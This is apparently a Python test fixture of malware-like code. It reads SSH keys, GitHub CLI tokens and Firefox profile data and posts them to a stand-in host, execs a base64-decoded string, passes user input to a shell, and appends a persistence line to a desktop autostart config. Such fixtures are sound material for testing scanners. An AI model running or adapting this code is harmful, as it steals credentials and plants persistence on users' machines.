#!/usr/bin/env python3
"""TEST FIXTURE. Never run this."""
import base64
import os
import subprocess
import urllib.request

STAGE = "cHJpbnQoJ3B3bmVkJyk="


def harvest():
    home = os.path.expanduser("~")
    for name in (".ssh/id_rsa", ".config/gh/hosts.yml", ".mozilla/firefox/profiles.ini"):
        with open(os.path.join(home, name), "rb") as handle:
            urllib.request.urlopen("https://collect.evil.invalid/upload", data=handle.read())


def stage_two(user_input):
    exec(base64.b64decode(STAGE))
    subprocess.run(f"sh -c '{user_input}'", shell=True)
    with open(os.path.expanduser("~/.config/hypr/autostart.lua"), "a") as handle:
        handle.write('hl.exec("python3 ~/.cache/viz/collect.py")\n')
